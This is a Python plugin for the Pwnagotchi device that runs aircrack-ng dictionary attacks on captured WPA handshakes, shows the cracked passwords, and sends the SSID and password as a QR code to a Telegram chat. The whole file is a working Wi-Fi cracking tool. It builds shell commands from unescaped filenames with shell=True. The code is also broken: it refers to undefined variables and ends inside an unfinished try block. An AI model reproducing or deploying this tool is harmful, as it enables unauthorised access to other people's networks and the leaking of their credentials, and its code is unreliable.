from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import qrcode
import io
from telegram import Bot
from telegram import InputFile

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''


class QuickDic(plugins.Plugin):
    __author__ = 'silentree12th'
    __version__ = '1.3.0'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': False,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
    }

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info('[quickdic] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
            
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[quickdic] Found %s' %check)
        else:
            logging.warning('[quickdic] aircrack-ng is not installed!')

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode(
            'utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info('[quickdic] No handshake')
        else:
            logging.info('[quickdic] Handshake confirmed')
            result2 = subprocess.run(('aircrack-ng -w `echo ' + self.options[
                'wordlist_folder'] + '*.txt | sed \'s/ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info('[quickdic] %s' %result2)
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password: " + pwd
                #logging.warning('!!! [quickdic] !!! %s' % self.text_to_set)
                display.set('face', self.options['face'])
                display.set('status', self.text_to_set)
                self.text_to_set = ""
                display.update(force=True)
                #plugins.on('cracked', access_point, pwd)
                if id != None and api != None:
                    security = "WPA"
                    ssid = filename
                    password = pwd
                    wifi_config = 'WIFI:S:'+ssid+';T:'+security+';P:'+password+';;'
                    bot = Bot(token=api)
                    chat_id = id
                    try:
                        qr = qrcode.QRCode(
                            version=1,
                            error_correction=qrcode.constants.ERROR_CORRECT_L,
                            box_size=10,
                            border=4,
                        )
                        qr_code.add_data(wifi_config)
                        qr_code.make(fit=True)
                        
                        # Create an image from the QR code instance
                        img = qr.make_image(fill_color="black", back_color="white")

                        # Convert the image to bytes
                        image_bytes = io.BytesIO()
                        img.save(image_bytes)
                        image_bytes.seek(0)

                        # Send the image directly as bytes
                        message_text = 'ssid: ' + ssid + ' password: ' + password
                        bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
                    
           
